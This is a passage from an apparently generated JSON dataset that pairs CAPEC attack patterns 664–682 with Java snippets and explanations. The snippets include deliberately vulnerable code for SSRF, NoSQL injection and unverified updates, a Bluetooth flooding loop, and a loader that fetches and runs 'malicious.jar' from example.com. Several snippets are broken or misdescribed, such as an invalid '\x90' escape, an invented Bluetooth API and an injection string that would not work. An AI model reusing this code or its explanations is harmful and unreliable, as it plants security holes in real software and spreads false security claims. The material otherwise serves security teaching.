        "description": "This Java code snippet demonstrates a simplified example of exploiting transient instruction execution to expose sensitive data. The main idea is to simulate speculative execution where a branch prediction may lead to accessing sensitive data (SECRET) transiently. The 'getIndex' method simulates a branch prediction vulnerability by returning a potentially out-of-bounds index. If the index is within bounds, the code accesses the SECRET and uses it in a cache access, creating a covert channel through cache timing. This represents the CAPEC's concept of exploiting transient execution to expose sensitive data and bypass access controls, leveraging related CWEs such as non-transparent sharing of microarchitectural resources and exposure of sensitive information during transient execution."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class SSRFExample {\n    public static void main(String[] args) {\n        try {\n            // User input URL (potentially malicious)\n            String userInputUrl = args[0];\n            \n            // No validation of the user input URL\n            URL url = new URL(userInputUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            \n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuffer content = new StringBuffer();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n            connection.disconnect();\n            \n            // Output the response from the requested URL\n            System.out.println(content.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Server-Side Request Forgery (SSRF) vulnerability. The program takes a URL as input from the user (via command-line arguments) and makes an HTTP GET request to that URL without any validation. This lack of input validation (CWE-20) allows an attacker to craft a malicious URL that could force the server to make requests to internal services or external third parties with the server's privileges. The code also highlights the risk of external control of assumed-immutable web parameters (CWE-472) since the URL is directly controlled by the user input. The main idea represented here is the exploitation of improper input validation to perform unauthorized actions on behalf of the server, which is the essence of SSRF attacks."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class ThunderboltExploit {\n    private static final String FIRMWARE_PATH = \"/path/to/thunderbolt/firmware.bin\";\n    private static final String MALICIOUS_FIRMWARE = \"/path/to/malicious/firmware.bin\";\n\n    public static void main(String[] args) {\n        try {\n            // CWE-345: Insufficient Verification of Data Authenticity\n            byte[] firmwareData = Files.readAllBytes(Paths.get(FIRMWARE_PATH));\n            if (!verifyFirmware(firmwareData)) {\n                System.out.println(\"Firmware verification failed.\");\n                return;\n            }\n\n            // CWE-353: Missing Support for Integrity Check\n            if (!checkIntegrity(firmwareData)) {\n                System.out.println(\"Firmware integrity check failed.\");\n                return;\n            }\n\n            // CWE-288: Authentication Bypass Using an Alternate Path or Channel\n            if (bypassAuthentication()) {\n                System.out.println(\"Authentication bypassed.\");\n            }\n\n            // CWE-1188: Initialization of a Resource with an Insecure Default\n            initializeResourceWithInsecureDefault();\n\n            // CWE-862: Missing Authorization\n            if (!isAuthorized()) {\n                System.out.println(\"Unauthorized access attempt.\");\n                return;\n            }\n\n            // Exploit: Replace firmware with malicious version\n            Files.write(Paths.get(FIRMWARE_PATH), Files.readAllBytes(Paths.get(MALICIOUS_FIRMWARE)));\n            System.out.println(\"Firmware replaced with malicious version.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean verifyFirmware(byte[] data) {\n        // Dummy verification logic\n        return true; // CWE-345: Always returns true, insufficient verification\n    }\n\n    private static boolean checkIntegrity(byte[] data) {\n        // Dummy integrity check logic\n        return true; // CWE-353: Always returns true, missing proper integrity check\n    }\n\n    private static boolean bypassAuthentication() {\n        // Dummy authentication bypass logic\n        return true; // CWE-288: Bypasses authentication\n    }\n\n    private static void initializeResourceWithInsecureDefault() {\n        // Dummy initialization logic\n        System.out.println(\"Resource initialized with insecure default.\"); // CWE-1188\n    }\n\n    private static boolean isAuthorized() {\n        // Dummy authorization check\n        return false; // CWE-862: Always returns false, missing proper authorization\n    }\n}",
        "description": "This Java code snippet simulates an exploitation of Thunderbolt protection flaws by leveraging several common weaknesses. The code reads the current firmware, performs insufficient verification and integrity checks, bypasses authentication, initializes a resource with an insecure default, and fails to properly authorize access. Finally, it replaces the firmware with a malicious version. This demonstrates how an adversary could exploit these vulnerabilities to manipulate Thunderbolt controller firmware, subvert authentication mechanisms, and gain unauthorized access to a device."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "import javax.bluetooth.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class BlueSmackingAttack {\n    public static void main(String[] args) throws IOException, BluetoothStateException {\n        LocalDevice localDevice = LocalDevice.getLocalDevice();\n        DiscoveryAgent agent = localDevice.getDiscoveryAgent();\n        Vector<RemoteDevice> devices = new Vector<>();\n\n        agent.startInquiry(DiscoveryAgent.GIAC, new DiscoveryListener() {\n            public void deviceDiscovered(RemoteDevice btDevice, DeviceClass cod) {\n                devices.add(btDevice);\n            }\n\n            public void inquiryCompleted(int discType) {\n                System.out.println(\"Device Inquiry Completed.\");\n            }\n\n            public void servicesDiscovered(int transID, ServiceRecord[] servRecord) {}\n\n            public void serviceSearchCompleted(int transID, int respCode) {}\n        });\n\n        try {\n            Thread.sleep(10000); // Wait for device discovery\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n\n        for (RemoteDevice device : devices) {\n            try {\n                L2CAPConnection connection = (L2CAPConnection) Connector.open(\"btl2cap://\" + device.getBluetoothAddress() + \":1001\");\n                byte[] largePacket = new byte[65535]; // Large packet to flood\n                Arrays.fill(largePacket, (byte) 0xFF);\n                while (true) {\n                    connection.send(largePacket); // Flooding the device\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a BlueSmacking attack, where an adversary floods Bluetooth-enabled devices with large packets over the L2CAP protocol to create a Denial of Service (DoS). The code first discovers nearby Bluetooth devices and then attempts to establish an L2CAP connection to each discovered device. It then continuously sends large packets to the connected devices, overwhelming their resources and causing a DoS. This code also highlights CWE-404 (Improper Resource Shutdown or Release) as it does not properly manage the connection resources, potentially leading to resource exhaustion. Additionally, it indirectly touches on CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) by not securing the communication channel."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "import javax.bluetooth.*;\nimport java.io.IOException;\n\npublic class BluetoothImpersonationAttack {\n    public static void main(String[] args) {\n        try {\n            // Simulate an adversary setting their device's MAC address to a trusted one\n            String trustedMacAddress = \"00:11:22:33:44:55\";\n            LocalDevice localDevice = LocalDevice.getLocalDevice();\n            localDevice.setBluetoothAddress(trustedMacAddress);\n\n            // Attempt to connect to a target device\n            RemoteDevice targetDevice = RemoteDevice.getRemoteDevice(localDevice);\n            if (authenticate(targetDevice)) {\n                System.out.println(\"Authentication successful. Performing malicious actions...\");\n                // Perform malicious actions on the target device\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } catch (BluetoothStateException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean authenticate(RemoteDevice device) {\n        // Weak authentication mechanism\n        try {\n            return device.authenticate();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Bluetooth Impersonation Attack (BIAS) by simulating an adversary who sets their device's MAC address to that of a trusted device. The code then attempts to authenticate with a target device using a weak authentication mechanism. If successful, the adversary can perform malicious actions on the target device. This example embodies the main idea of CAPEC-290 (Authentication Bypass by Spoofing) and related CWEs such as CWE-940 (Improper Verification of Source of a Communication Channel) and CWE-1390 (Weak Authentication). The code highlights the vulnerability of improperly implemented authentication schemes and the potential for spoofing attacks."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "import javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.Cipher;\nimport java.security.SecureRandom;\nimport java.util.Arrays;\n\npublic class BluetoothKeyNegotiation {\n    public static void main(String[] args) throws Exception {\n        // Simulate key negotiation with low entropy\n        byte[] entropy = new byte[1]; // CWE-693: Insufficient entropy\n        SecureRandom random = new SecureRandom();\n        random.nextBytes(entropy);\n\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"AES\");\n        keyGen.init(128, new SecureRandom(entropy)); // CWE-757: Algorithm Downgrade\n        SecretKey secretKey = keyGen.generateKey();\n\n        // Encrypt a sample message\n        Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        byte[] encryptedMessage = cipher.doFinal(\"Sensitive Data\".getBytes());\n\n        System.out.println(\"Encrypted Message: \" + Arrays.toString(encryptedMessage));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Bluetooth key negotiation process. The key negotiation uses low entropy (only 1 byte), making it easy for an attacker to guess the key (CWE-693: Protection Mechanism Failure). The key generation process uses a weak entropy source, which can be exploited by an attacker to decrypt the communication. Additionally, the code does not ensure the strongest available algorithm is used (CWE-757: Algorithm Downgrade), further weakening the security. This represents the main idea of the CAPEC 'Key Negotiation of Bluetooth Attack (KNOB)', where an attacker can exploit weak key negotiation to decrypt information sent between Bluetooth devices."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class SoftwareUpdate {\n    public static void main(String[] args) {\n        try {\n            URL updateUrl = new URL(\"http://example.com/update\");\n            HttpURLConnection connection = (HttpURLConnection) updateUrl.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            InputStream inputStream = connection.getInputStream();\n            FileOutputStream outputStream = new FileOutputStream(\"update.bin\");\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                outputStream.write(buffer, 0, bytesRead);\n            }\n\n            inputStream.close();\n            outputStream.close();\n\n            // Simulate applying the update\n            applyUpdate(\"update.bin\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void applyUpdate(String filePath) {\n        // Vulnerable code: No verification of the update file\n        try {\n            FileInputStream fileInputStream = new FileInputStream(filePath);\n            byte[] updateData = new byte[fileInputStream.available()];\n            fileInputStream.read(updateData);\n            fileInputStream.close();\n\n            // Simulate executing the update\n            System.out.println(\"Update applied: \" + new String(updateData));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software update mechanism. The main function downloads an update file from a specified URL and saves it locally. The applyUpdate method then reads and applies the update without any verification of its integrity or authenticity. This lack of verification makes the system susceptible to an 'Alteration of a Software Update' attack, where an adversary could insert malicious code into the update. The code also highlights related weaknesses such as reliance on untrusted inputs (CWE-807) and the potential for embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "public class MaliciousTool {\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        if (isMaliciousCondition()) {\n            executeMaliciousPayload();\n        }\n\n        // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n        // This security check might be optimized away by a maliciously altered compiler\n        if (!isSecure()) {\n            System.out.println(\"Security check failed!\");\n        }\n\n        // CWE-913: Improper Control of Dynamically-Managed Code Resources\n        String sensitiveData = \"Sensitive Information\";\n        if (isMaliciousCondition()) {\n            sensitiveData = \"Exposed Information\";\n        }\n        System.out.println(sensitiveData);\n    }\n\n    private static boolean isMaliciousCondition() {\n        // Simulate a condition that triggers malicious behavior\n        return true;\n    }\n\n    private static void executeMaliciousPayload() {\n        // Simulate malicious payload execution\n        System.out.println(\"Executing malicious payload...\");\n    }\n\n    private static boolean isSecure() {\n        // Simulate a security check\n        return false;\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Software Development Tools Maliciously Altered' (CAPEC) by embedding malicious code and simulating the effects of compromised development tools. The code includes:\n\n1. CWE-506: Embedded Malicious Code - The `isMaliciousCondition` method simulates a condition that triggers malicious behavior, leading to the execution of `executeMaliciousPayload`.\n2. CWE-733: Compiler Optimization Removal or Modification of Security-critical Code - The `isSecure` method simulates a security check that might be optimized away by a maliciously altered compiler.\n3. CWE-913: Improper Control of Dynamically-Managed Code Resources - The `sensitiveData` variable is improperly controlled and can be altered based on a malicious condition, leading to the exposure of sensitive information.\n\nThe code represents the main idea of CAPEC by showing how a maliciously altered development tool can introduce vulnerabilities and malicious behavior into the software being developed."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "public class ASICSecurity {\n    private String securityToken;\n    private String securityIdentifier;\n    private String confidentialInfo;\n\n    public ASICSecurity(String token, String identifier, String info) {\n        this.securityToken = token;\n        this.securityIdentifier = identifier;\n        this.confidentialInfo = info;\n    }\n\n    public void setSecurityToken(String token) {\n        // CWE-1270: Generation of Incorrect Security Tokens\n        if (token == null || token.isEmpty()) {\n            this.securityToken = \"defaultToken\"; // Incorrect token generation\n        } else {\n            this.securityToken = token;\n        }\n    }\n\n    public void setSecurityIdentifier(String identifier) {\n        // CWE-1294: Insecure Security Identifier Mechanism\n        if (identifier == null || identifier.isEmpty()) {\n            this.securityIdentifier = \"defaultIdentifier\"; // Insecure identifier\n        } else {\n            this.securityIdentifier = identifier;\n        }\n    }\n\n    public String getConfidentialInfo() {\n        // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n        return this.confidentialInfo; // Confidential info not protected\n    }\n\n    public static void main(String[] args) {\n        // CWE-1259: Improper Restriction of Security Token Assignment\n        ASICSecurity asic = new ASICSecurity(\"\", \"\", \"SensitiveData\");\n        asic.setSecurityToken(\"\");\n        asic.setSecurityIdentifier(\"\");\n        System.out.println(\"Confidential Info: \" + asic.getConfidentialInfo());\n    }\n}",
        "description": "This Java code snippet represents a simplified version of an ASIC (Application Specific Integrated Circuit) security mechanism that embodies the vulnerabilities described in the CAPEC and related CWEs. The class `ASICSecurity` has three main attributes: `securityToken`, `securityIdentifier`, and `confidentialInfo`. The methods `setSecurityToken` and `setSecurityIdentifier` demonstrate improper handling and generation of security tokens and identifiers, respectively, leading to potential security issues (CWE-1270 and CWE-1294). The method `getConfidentialInfo` returns confidential information without any protection, making it accessible to unauthorized entities (CWE-1297). The `main` method initializes an `ASICSecurity` object with insecure default values, illustrating improper restriction of security token assignment (CWE-1259). This code highlights how maliciously altered requirements can lead to an ASIC that does not meet security needs and contains vulnerabilities."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "public class MaliciousChipProgramming {\n    private static final int SECRET_KEY = 0xDEADBEEF; // CWE-506: Embedded Malicious Code\n    private static final int CONTROL_REGISTER = 0x1000; // CWE-1262: Improper Access Control for Register Interface\n    private static final int SECURITY_TOKEN = 0x1; // CWE-1259: Improper Restriction of Security Token Assignment\n\n    public static void main(String[] args) {\n        // Simulate malicious alteration during chip programming\n        if (isMaliciousConditionMet()) {\n            executeMaliciousPayload();\n        }\n    }\n\n    private static boolean isMaliciousConditionMet() {\n        // Check some condition to trigger the malicious code\n        return true; // Always true for demonstration purposes\n    }\n\n    private static void executeMaliciousPayload() {\n        // CWE-509: Replicating Malicious Code (Virus or Worm)\n        System.out.println(\"Malicious payload executed!\");\n        // Simulate improper access to a control register\n        int registerValue = readRegister(CONTROL_REGISTER);\n        // Simulate improper restriction of security token\n        if (registerValue == SECURITY_TOKEN) {\n            System.out.println(\"Security token compromised!\");\n        }\n    }\n\n    private static int readRegister(int address) {\n        // Simulate reading from a memory-mapped I/O register\n        return SECRET_KEY; // Return a secret key for demonstration\n    }\n}",
        "description": "This Java code snippet simulates a scenario where malicious code is implanted during the chip programming phase, embodying the main idea of the CAPEC. The code includes several CWE-related vulnerabilities:\n\n1. **CWE-506: Embedded Malicious Code** - The `SECRET_KEY` is an example of embedded malicious code.\n2. **CWE-1262: Improper Access Control for Register Interface** - The `CONTROL_REGISTER` is accessed without proper control.\n3. **CWE-1259: Improper Restriction of Security Token Assignment** - The `SECURITY_TOKEN` is improperly protected and checked.\n4. **CWE-509: Replicating Malicious Code (Virus or Worm)** - The `executeMaliciousPayload` method simulates the execution of a malicious payload that could replicate.\n\nThe `main` method checks a condition to trigger the malicious payload, which then reads a control register and checks a security token, simulating improper access and security token handling."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousSoftware {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious.jar\");\n            InputStream in = url.openStream();\n            Files.copy(in, Paths.get(\"malicious.jar\"), StandardCopyOption.REPLACE_EXISTING);\n            in.close();\n\n            // Load the downloaded JAR file (potentially malicious)\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new File(\"malicious.jar\").toURI().toURL()});\n            Class<?> clazz = classLoader.loadClass(\"com.example.MaliciousClass\");\n            Runnable maliciousCode = (Runnable) clazz.getDeclaredConstructor().newInstance();\n\n            // CWE-506: Embedded Malicious Code\n            // CWE-507: Trojan Horse\n            maliciousCode.run();\n\n            // CWE-215: Insertion of Sensitive Information Into Debugging Code\n            System.out.println(\"Debug: Sensitive information: \" + System.getenv(\"SECRET_KEY\"));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a developer inadvertently signs and distributes malicious software. The code downloads a JAR file from a remote location without verifying its integrity (CWE-494). It then loads and executes a class from the downloaded JAR, which could contain malicious code (CWE-506, CWE-507). Additionally, the code prints sensitive information for debugging purposes, which should not be included in production code (CWE-215). This represents the CAPEC scenario where a developer unknowingly signs and distributes software that has been maliciously altered."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "public class FPGAMaliciousAlteration {\n    private static boolean securityCheck() {\n        // Security-critical check that might be optimized away\n        return true;\n    }\n\n    public static void main(String[] args) {\n        if (securityCheck()) {\n            // Malicious code embedded in the FPGA configuration\n            System.out.println(\"Loading malicious FPGA configuration...\");\n            loadMaliciousFPGAConfig();\n        } else {\n            System.out.println(\"Security check failed. Aborting.\");\n        }\n    }\n\n    private static void loadMaliciousFPGAConfig() {\n        // Simulate the loading of a malicious FPGA configuration\n        System.out.println(\"FPGA configuration altered. System compromised.\");\n    }\n}",
        "description": "This Java code snippet simulates the malicious alteration of an FPGA configuration, embodying the main idea of the CAPEC. The `securityCheck` method represents a security-critical check that could be optimized away by the processor or compiler (CWE-1037, CWE-733). The `main` method checks this security condition before proceeding to load a malicious FPGA configuration, simulating the embedding of malicious code (CWE-506). The `loadMaliciousFPGAConfig` method represents the action of altering the FPGA configuration to compromise the system. This code demonstrates how an adversary might introduce malicious functionality into an FPGA by bypassing or removing security checks."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class DecommissionedDeviceHandler {\n    public static void main(String[] args) {\n        String sensitiveData = \"Sensitive Information\";\n        File file = new File(\"sensitiveData.txt\");\n\n        // Simulate writing sensitive data to a file\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // Simulate decommissioning the device\n        decommissionDevice(file);\n    }\n\n    public static void decommissionDevice(File file) {\n        // Improper scrubbing of sensitive data (CWE-1266, CWE-1301)\n        if (file.exists()) {\n            file.delete(); // This does not securely delete the file\n        }\n\n        // Sensitive information in resource not removed before reuse (CWE-226)\n        // Cleartext storage of sensitive information in memory (CWE-316)\n        // Operation on a resource after expiration or release (CWE-672)\n        // The sensitive data is still recoverable from the storage medium\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive data is written to a file and then the device is decommissioned by deleting the file. However, the deletion is not secure, and the sensitive data remains recoverable from the storage medium. This embodies the main idea of the CAPEC 'Retrieve Data from Decommissioned Devices' and highlights related weaknesses such as improper scrubbing of sensitive data (CWE-1266, CWE-1301), sensitive information not removed before reuse (CWE-226), cleartext storage of sensitive information in memory (CWE-316), and operation on a resource after expiration or release (CWE-672)."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "import com.mongodb.MongoClient;\nimport com.mongodb.client.MongoCollection;\nimport com.mongodb.client.MongoDatabase;\nimport org.bson.Document;\n\npublic class NoSQLInjectionExample {\n    public static void main(String[] args) {\n        MongoClient mongoClient = new MongoClient(\"localhost\", 27017);\n        MongoDatabase database = mongoClient.getDatabase(\"testdb\");\n        MongoCollection<Document> collection = database.getCollection(\"users\");\n\n        // User input that is not properly sanitized\n        String userInput = \"admin' || '1'=='1\";\n\n        // Vulnerable query construction\n        Document query = new Document(\"username\", userInput);\n\n        // Executing the query\n        Document user = collection.find(query).first();\n\n        if (user != null) {\n            System.out.println(\"User found: \" + user.toJson());\n        } else {\n            System.out.println(\"User not found\");\n        }\n\n        mongoClient.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a NoSQL injection vulnerability in a MongoDB query. The code connects to a MongoDB database and constructs a query using user input without proper sanitization. The user input is directly embedded into the query, which can be exploited by an attacker to manipulate the query logic. In this example, the input 'admin' || '1'=='1' is used to bypass authentication by always evaluating the condition to true. This embodies the main idea of CAPEC-943 and related CWEs, highlighting the risks of improper neutralization of special elements and improper validation of input syntax."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class MaliciousFirmwareUpdater {\n    private static final String FIRMWARE_PATH = \"/path/to/firmware.bin\";\n    private static final String MALICIOUS_CODE = \"\\x90\\x90\\x90\\x90\"; // NOP sled for shellcode\n\n    public static void main(String[] args) {\n        try {\n            // Simulate firmware update with malicious code injection\n            FileOutputStream fos = new FileOutputStream(FIRMWARE_PATH, true);\n            fos.write(MALICIOUS_CODE.getBytes());\n            fos.close();\n            System.out.println(\"Firmware updated successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // Simulate improper access control to hardware registers\n    public void accessHardwareRegister() {\n        int registerValue = readRegister(0xDEADBEEF); // Example register address\n        System.out.println(\"Register value: \" + registerValue);\n    }\n\n    private int readRegister(int address) {\n        // Simulate exposure of sensitive system information\n        return 0xCAFEBABE; // Example sensitive data\n    }\n}",
        "description": "This Java code snippet simulates a malicious firmware update process, embodying the concept of 'Server Motherboard Compromise' (CAPEC). The code demonstrates how malware can be inserted into a server's firmware (flash memory) during an update. The `MaliciousFirmwareUpdater` class contains a method to append malicious code to a firmware file, representing CWE-506 (Embedded Malicious Code). Additionally, the `accessHardwareRegister` method simulates improper access control to hardware registers (CWE-1262) and the exposure of sensitive system information (CWE-497). The `readRegister` method returns a hardcoded sensitive value, illustrating the potential for unauthorized access to critical system data."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class BuildConfig {\n    public static void main(String[] args) {\n        String configFilePath = \"/tmp/build_config.txt\";\n        String sensitiveData = \"db_password=supersecret\";\n\n        // CWE-377: Insecure Temporary File\n        try (FileWriter writer = new FileWriter(configFilePath)) {\n            writer.write(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-426: Untrusted Search Path\n        String untrustedPath = System.getenv(\"UNTRUSTED_PATH\");\n        if (untrustedPath != null) {\n            try {\n                Files.readAllLines(Paths.get(untrustedPath + \"/malicious_config.txt\"));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        System.out.println(\"Config file path: \" + configFilePath);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where the system build data can be maliciously altered, embodying the main idea of the CAPEC. The code creates an insecure temporary file (CWE-377) to store sensitive configuration data, which can be easily accessed and modified by unauthorized actors. It also uses an untrusted search path (CWE-426) to read configuration data, which can lead to the execution of malicious configurations. Additionally, the code exposes the path of the configuration file (CWE-497), potentially leaking sensitive system information to unauthorized users. This snippet highlights the risks associated with improper handling of build configuration data and the potential for deliberate misconfiguration of the system."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "public class MemoryProtectionExample {\n    private static final int PROTECTED_REGION_START = 0x1000;\n    private static final int PROTECTED_REGION_END = 0x2000;\n    private static final int UNPROTECTED_REGION_START = 0x2000;\n    private static final int UNPROTECTED_REGION_END = 0x3000;\n\n    private static byte[] memory = new byte[0x4000];\n\n    public static void main(String[] args) {\n        // Simulate writing to protected region\n        writeMemory(0x1500, (byte) 0xAA); // Should be protected but is not\n\n        // Simulate writing to unprotected region\n        writeMemory(0x2500, (byte) 0xBB); // Unprotected\n\n        // Simulate reading from protected region\n        byte data = readMemory(0x1500); // Should be protected but is not\n        System.out.println(\"Data read from protected region: \" + data);\n    }\n\n    private static void writeMemory(int address, byte value) {\n        if (address >= PROTECTED_REGION_START && address < PROTECTED_REGION_END) {\n            System.out.println(\"Warning: Writing to protected region at address \" + address);\n        }\n        memory[address] = value;\n    }\n\n    private static byte readMemory(int address) {\n        if (address >= PROTECTED_REGION_START && address < PROTECTED_REGION_END) {\n            System.out.println(\"Warning: Reading from protected region at address \" + address);\n        }\n        return memory[address];\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where memory protection is improperly configured, allowing read and write operations to a protected memory region. The code defines protected and unprotected memory regions but does not enforce proper access control, allowing unauthorized access to the protected region. This embodies the main idea of CAPEC-Exploitation of Improperly Configured or Implemented Memory Protections and highlights related CWEs such as insufficient granularity of address regions, improper access control, and overlapping protected and unprotected memory ranges."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "public class RegisterAccess {\n    private static final int LOCK_BIT = 0x1;\n    private int controlRegister = 0x0;\n    private boolean lockBitSet = false;\n\n    public void setControlRegister(int value) {\n        if (!lockBitSet) {\n            controlRegister = value;\n        } else {\n            System.out.println(\"Error: Control register is locked.\");\n        }\n    }\n\n    public void setLockBit() {\n        lockBitSet = true;\n    }\n\n    public void modifyLockBit(boolean newValue) {\n        lockBitSet = newValue; // CWE-1231: Improper Prevention of Lock Bit Modification\n    }\n\n    public int getControlRegister() {\n        return controlRegister;\n    }\n\n    public static void main(String[] args) {\n        RegisterAccess regAccess = new RegisterAccess();\n        regAccess.setControlRegister(0xFF);\n        regAccess.setLockBit();\n        regAccess.modifyLockBit(false); // Vulnerability: lock bit can be modified\n        regAccess.setControlRegister(0xAA); // Control register can be modified after lock bit is reset\n        System.out.println(\"Control Register: \" + regAccess.getControlRegister());\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the exploitation of improperly controlled registers. The `RegisterAccess` class simulates a control register with a lock bit mechanism. The `setControlRegister` method allows setting the control register value only if the lock bit is not set. The `setLockBit` method sets the lock bit to prevent further modifications. However, the `modifyLockBit` method allows changing the lock bit value even after it has been set, representing CWE-1231: Improper Prevention of Lock Bit Modification. This vulnerability allows an adversary to reset the lock bit and modify the control register, which should have been protected. The main idea of the CAPEC is illustrated by showing how missing or incorrectly configured access control within registers can be exploited to modify data that should be protected."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "public class SoCSecurityManager {\n    private static final String DEFAULT_SECURITY_TOKEN = \"DEFAULT_TOKEN\";\n    private Map<String, String> entityTokens = new HashMap<>();\n\n    public SoCSecurityManager() {\n        // Initialize with some default tokens\n        entityTokens.put(\"entity1\", \"TOKEN1\");\n        entityTokens.put(\"entity2\", \"TOKEN2\");\n    }\n\n    public void performAction(String entityId, String action) {\n        String token = entityTokens.getOrDefault(entityId, DEFAULT_SECURITY_TOKEN);\n        if (isValidToken(token)) {\n            System.out.println(\"Action \" + action + \" performed by \" + entityId);\n        } else {\n            System.out.println(\"Invalid token for entity \" + entityId + \". Action \" + action + \" denied.\");\n        }\n    }\n\n    private boolean isValidToken(String token) {\n        // Simulate token validation logic\n        return !token.equals(DEFAULT_SECURITY_TOKEN);\n    }\n\n    public static void main(String[] args) {\n        SoCSecurityManager manager = new SoCSecurityManager();\n        manager.performAction(\"entity1\", \"read\"); // Valid token\n        manager.performAction(\"entity3\", \"write\"); // Invalid token, uses default\n    }\n}",
        "description": "This Java code snippet represents a simplified version of a System-on-Chip (SoC) security manager that uses security tokens to control access to actions. The `SoCSecurityManager` class maintains a map of entity IDs to their corresponding security tokens. When an action is performed by an entity, the system retrieves the token associated with the entity. If the token is valid, the action is allowed; otherwise, it is denied. The code demonstrates vulnerabilities such as the use of a default security token (CWE-1259), potential for incorrect token generation (CWE-1270), and missing source identifiers (CWE-1302). This example highlights the importance of properly managing and validating security tokens to prevent unauthorized access."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
